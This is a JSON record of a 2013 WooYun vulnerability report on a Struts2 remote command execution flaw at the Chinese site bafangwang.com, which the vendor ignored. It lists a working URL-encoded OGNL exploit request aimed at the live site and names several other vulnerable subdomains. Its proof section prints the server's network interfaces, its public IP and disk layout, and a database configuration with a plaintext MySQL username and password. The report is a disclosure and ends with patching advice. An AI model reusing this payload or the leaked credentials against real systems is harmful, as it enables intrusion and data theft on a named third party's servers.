{"id": 63067, "wybug_id": "wooyun-2013-033204", "wybug_title": "八方网某站struts2命令执行漏洞", "wybug_corp": "八方网", "wybug_author": "曹操", "wybug_date": "2013-08-02 13:47", "wybug_open_date": "2013-09-16 13:48", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-09-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt发现已经泛滥了，各位手下留情吧！ 详细说明：  http://www.bafangwang.com/cat.do?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D网上搜了一下，以下域名都在一个服务器上，赶紧修复吧！同时检查一下服务器，清理一下web目录下的shellhttp://www.bafangwang.com/cat.dohttp://sso.bafangwang.com/security.actionhttp://bengbu.bafangwang.com/cat.dohttp://chongqing.bafangwang.com/cat.dohttp://hangzhou.bafangwang.com/yqlj.dohttp://jinhua.bafangwang.com/storeDetail.dohttp://2fwww.bafangwang.com/info_issuance/infoDetail.do   漏洞证明：  \n\neth1      Link encap:Ethernet  HWaddr 00:15:17:88:CB:2D            UP BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)          Interrupt:19 Memory:b8800000-b8820000 eth2      Link encap:Ethernet  HWaddr 00:15:17:88:CB:2C            inet addr:121.52.210.177  Bcast:121.52.210.255  Mask:255.255.255.0          inet6 addr: fe80::215:17ff:fe88:cb2c/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:487582321 errors:139 dropped:0 overruns:0 frame:93          TX packets:462349471 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:87493367650 (81.4 GiB)  TX bytes:361000438471 (336.2 GiB)          Interrupt:18 Memory:b8820000-b8840000 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:693417818 errors:0 dropped:0 overruns:0 frame:0          TX packets:693417818 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:1216582809504 (1.1 TiB)  TX bytes:1216582809504 (1.1 TiB)/dev/mapper/VolGroup-lv_root                       50G  8.5G   39G  18% /tmpfs                 4.0G     0  4.0G   0% /dev/shm/dev/sda1             485M   38M  422M   9% /boot/dev/mapper/VolGroup-lv_home                      402G   83G  299G  22% /home\t\t<property name=\"driverClass\" value=\"com.mysql.jdbc.Driver\" />\t\t<property name=\"jdbcUrl\" value=\"jdbc:mysql://localhost/bfw_root?useUnicode=true&amp;characterEncoding=utf8\" />\t\t<property name=\"user\" value=\"bfw\" />\t\t<property name=\"password\" value=\"i2GYSDHANESpoLrQ1kW6uwQC\" />   修复方案：  打struts2补丁，检查linux后门，删除web下面的shell   版权声明：转载请注明来源 曹操@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}